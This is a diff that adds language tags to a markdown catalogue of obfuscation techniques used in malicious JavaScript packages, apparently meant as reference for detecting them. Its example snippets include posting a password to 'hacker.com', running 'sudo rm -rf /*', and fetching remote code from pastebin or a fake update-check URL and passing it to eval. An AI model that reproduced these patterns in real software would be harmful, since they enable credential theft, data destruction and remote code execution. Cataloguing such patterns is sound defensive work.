@@ -1,6 +1,6 @@
 # 1 Keyword disguise
 ## 1.1 Concatenated String
-```
+```javascript
 var url_part_1 = 'h' + 't' + 't' + 'p' // <--- disguised http keyword
 var url_part_2 = ['api.github', '.com/repos'].join('')
 var address = url_part_1 + url_part_2;
@@ -23,7 +23,7 @@ http.request({
 ```
 
 ## 1.2 Encoded String
-```
+```javascript
 var e = Buffer.from(e, "hex").toString()
 var r = http.request({
     hostname: e,
@@ -48,7 +48,7 @@ http.request({
 
 **Execute js code**
 
-```
+```javascript
 eval('http.post("hacker.com", {"pwd": pwd})')
 ```
 Result:
@@ -58,7 +58,7 @@ eval('http.post("hacker.com", {"pwd": pwd})')
 ```
 
 **Execute shell command**
-```
+```javascript
 exec('sudo rm -rf /*', (err, stdout, stderr) => {
 });
 ```
@@ -71,7 +71,7 @@ exec('sudo rm -rf /*', (err, stdout, stderr) => {
 
 
 ## 2.2 Encoded code string
-```
+```javascript
 var a = 'asdfbakl2347198ebfkjdasfae' // <--- malicious code
 var decoded_a = Buffer.from(a, "hex").toString()
 eval(decoded_a)
@@ -85,7 +85,7 @@ eval(decoded_a)
 
 ## 2.3 Code from http response
 **Plain string**
-```
+```javascript
 https.get(
     {
         hostname: "pastebin.com",
@@ -115,7 +115,7 @@ https.get(
 ```
 
 **With Encoding**
-```
+```javascript
 try {
     https.get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
         try {
@@ -135,7 +135,7 @@ https.get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => 
 ```
 
 # 3 Name alias
-```
+```javascript
 var o = http
 function i(e, t, n) {
     e = 'http://google.com';
